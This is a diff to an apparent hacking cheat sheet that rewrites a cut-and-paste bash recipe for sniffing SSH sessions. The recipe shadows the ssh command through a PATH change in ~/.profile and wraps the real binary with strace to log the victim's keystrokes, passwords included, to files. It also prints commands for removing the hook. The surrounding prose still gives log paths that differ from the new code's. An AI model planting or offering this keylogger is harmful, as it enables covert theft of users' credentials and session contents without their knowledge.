@@ -684,30 +684,40 @@ Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strac
 
 Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
 ```
+# Cut & Paste the following into a bash shell:
+#! /bin/bash
 # Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
-$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
+echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile
 
 # Create a log directory and our own ssh binary
-$ mkdir -p ~/.local/bin ~/.ssh/logs
+mkdir -p ~/.local/bin ~/.local/logs
 
-$ cat >~/.local/bin/ssh
+cat <<__EOF__>~/.local/bin/ssh
 #! /bin/bash
-strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
-# now press CTRL-d to close the file.
+strace -e trace=read -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
+__EOF__
 
-$ cat ~/.local/bin/ssh-log
+cat <<__EOF__ >~/.local/bin/ssh-log
 #! /bin/bash
-grep 'read(4' | cut -f2 -d\" | while read -r x; do
-        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
-        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
+#grep --line-buffered 'read(4' | sed -u 's/.*"\(.*\)".*/\1/g' | while read -r x; do
+grep 'read(4' | cut -f2 -d\\" | while read -r x; do
+        if [ \${#x} -ne 2 ] && [ \${#x} -ne 1 ]; then continue; fi
+        if [ x"\${x}" == "x\\\\n" ] || [ x"\${x}" == "x\\\\r" ]; then
                 echo ""
         else
-                echo -n "${x}"
+                echo -n "\${x}"
         fi
-done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
-# now press CTRL-d to close the file
+done >\$HOME/.local/logs/ssh-log-"\${1}"-`date +%s`.txt
+__EOF__
 
-$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
+chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
+echo -e "\033[1;32mSUCCESS. Re-login as this user. Log files stored in ~/.local/.logs.
+To uninstall cut & paste this\033[0m:\033[1;36m
+  grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
+  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log
+  rmdir ~/.local/bin ~/.local &>/dev/null
+  rm -rf ~/.local/logs/ssh-log*.txt
+  rmdir ~/.local/logs &>/dev/null\033[0m"
 ```
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
